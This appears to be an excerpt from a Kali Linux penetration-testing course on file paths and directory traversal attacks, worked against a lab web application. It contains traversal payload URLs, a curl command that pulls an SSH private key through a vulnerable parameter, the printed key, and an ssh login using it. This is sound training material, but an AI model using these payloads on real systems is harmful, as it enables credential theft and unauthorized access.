### Made in Morocco
### Penetration Testing with Kali Linux

#### Using Absolute Pathing to Display File Contents
To demonstrate the use of absolute pathing, we will display the contents of the `/etc/passwd` file. We will start from the home directory of the `kali` user and use the `pwd` command to confirm our current directory.

1. **Confirm the Current Directory:**
   ```bash
   kali@kali:~$ pwd
   /home/kali
   ```

2. **List the Root Directory:**
   ```bash
   kali@kali:~$ ls /
   bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
   ```

3. **Display the Contents of `/etc/passwd` Using an Absolute Path:**
   ```bash
   kali@kali:~$ cat /etc/passwd
   root:x:0:0:root:/root:/usr/bin/zsh
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   sys:x:3:3:sys:/dev:/usr/sbin/nologin
   ...
   king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
   kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
   ```

**Explanation:**
- The `pwd` command confirms that we are in the `/home/kali` directory.
- The `ls /` command lists all files and directories in the root file system, including the `etc` directory.
- By using the absolute path `/etc/passwd`, we can access the file from any location in the file system. If we were to omit the leading slash, the terminal would search for the `etc` directory in the current working directory, which is `/home/kali`.

#### Using Relative Pathing to Display File Contents
Next, we will use relative pathing to achieve the same goal. We will display the contents of `/etc/passwd` using relative paths from the home directory of the `kali` user.

1. **Move Back One Directory:**
   ```bash
   kali@kali:~$ ls ../
   kali
   ```

2. **Move Back to the Root Directory:**
   ```bash
   kali@kali:~$ ls ../../
   bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
   ```

3. **List the Contents of `/etc`:**
   ```bash
   kali@kali:~$ ls ../../etc
   adduser.conf  debian_version  hostname  logrotate.conf  logrotate.d  pam.d  passwd  rmt  sudoers  zsh
   ```

4. **Display the Contents of `/etc/passwd` Using a Relative Path:**
   ```bash
   kali@kali:~$ cat ../../etc/passwd
   root:x:0:0:root:/root:/usr/bin/zsh
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   sys:x:3:3:sys:/dev:/usr/sbin/nologin
   ...
   king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
   kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
   ```

**Explanation:**
- The `../` sequence moves back one directory. To move more than one directory backwards, we can combine multiple `../` sequences.
- Using `ls ../../` lists the contents of the root file system, which contains the `etc` directory.
- By combining `../../etc/passwd`, we can display the contents of the `passwd` file using a relative path.

#### Analyzing Another Example
We can also use additional `../` sequences to achieve the same result.

```bash
kali@kali:~$ cat ../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```

**Explanation:**
- The number of `../` sequences is only relevant until we reach the root file system. Adding more `../` sequences beyond the root does not change the behavior.
- This can be useful when the current working directory is unknown, as it ensures we reach the root file system.

### Identifying and Exploiting Directory Traversals
In this section, we will explore Directory Traversal attacks, also known as path traversal attacks. These attacks can be used to access sensitive files on a web server and typically occur when a web application does not properly sanitize user input.

#### Web Application Structure
For a web application to display a specific page, the web server provides the file from the file system. These files are usually located in the web root directory or its subdirectories. In Linux systems, the `/var/www/html/` directory is often used as the web root.

- **Example URL:** `http://example.com/file.html`
- **File Path:** `/var/www/html/file.html`

If a web application is vulnerable to directory traversal, a user may access files outside of the web root by using relative paths, thus accessing sensitive files like SSH private keys or configuration files.

#### Identifying Directory Traversal Vulnerabilities
It is important to understand how to identify and exploit Directory Traversal vulnerabilities. Here are some steps to follow:

1. **Hover Over Buttons and Links:**
   - Check for parameters and other data about the application.
   - Example Link: `https://example.com/cms/login.php?language=en.html`
     - `login.php` indicates the web application uses PHP.
     - The `language` parameter with an HTML page as its value suggests we can try navigating to `https://example.com/cms/en.html`.

2. **Examine Parameters:**
   - Look for parameters that use files as values.
   - Example: `https://example.com/cms/index.php?page=admin.php`

3. **Directory Structure:**
   - Note the directory structure, such as `cms` in the URL, indicating the web application is running in a subdirectory of the web root.

#### Case Study: Mountain Desserts Web Application
Let's examine the Mountain Desserts web application. First, update the `/etc/hosts` file on the Kali machine to use the DNS name.

1. **Update `/etc/hosts` File:**
   ```bash
   127.0.0.1 localhost
   127.0.1.1 kali
   192.168.50.16 mountaindesserts.com
   ```

2. **Browse to the Target Web Application:**
   - Open the target web application at `http://mountaindesserts.com/meteor/index.php`.

3. **Analyze the Page:**
   - Hover over buttons and links to gather information about parameters and different pages.
   - Notice the "Admin" link at the bottom of the page: `http://mountaindesserts.com/meteor/index.php?page=admin.php`.

4. **Test for Directory Traversal:**
   - Use the `page` parameter to test for directory traversal.
   - Example: `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`

5. **Exploit the Vulnerability:**
   - If successful, the contents of `/etc/passwd` will be displayed.
   - Next, try to access the SSH private key: `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`

6. **Retrieve the Private Key:**
   - Use `curl` to retrieve the SSH private key:
     ```bash
     kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
     -----BEGIN OPENSSH PRIVATE KEY-----
     b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
     XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
     KCZOFoPU6kBkKyEhfjB82Ea1VoAvx4J4z7sNx1+wydQ/Kf7dawd95QjBuqLH9kQIEjkOGf
     BemTOAyCdTBxzUhDz1siP9uyofquA5vhmMXWyy68pLKXpiQqTF+foGQGG90MBXS5hwskYg
     ...
     lpWPWFQro9wzJ/uJsw/lepsqjrg2UvtrkAAADBAN5b6pbAdNmsQYmOIh8XALkNHwSusaK8
     bM225OyFIxS+BLieT7iByDK4HwBmdExod29fFPwG/6mXUL2Dcjb6zKJl7AGiyqm5+0Ju5e
     hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUyVJ/XxpBrb
     iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
     +2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
     -----END OPENSSH PRIVATE KEY-----
     ```

7. **Connect via SSH:**
   - Save the private key to a file and set appropriate permissions:
     ```bash
     kali@kali:~$ chmod 400 dt_key
     ```
   - Connect to the target system:
     ```bash
     kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
     ```

#### Directory Traversal on Windows
On Windows, the process is similar, but the files and directories differ. For example, you can test directory traversal using the `C:\Windows\System32\drivers\etc\hosts` file, which is readable by all local users.

- **Example URL:**
  - `http://example.com/index.php?page=../../../../../../../../Windows/System32/drivers/etc/hosts`

**Conclusion:**
Directory traversal vulnerabilities can be used to gather sensitive information. It is crucial to identify and exploit these vulnerabilities during penetration testing. Always use tools like Burp, cURL, or a programming language to perform thorough testing.

PWK - Copyright Â© 2023 OffSec Services Limited. All rights reserved.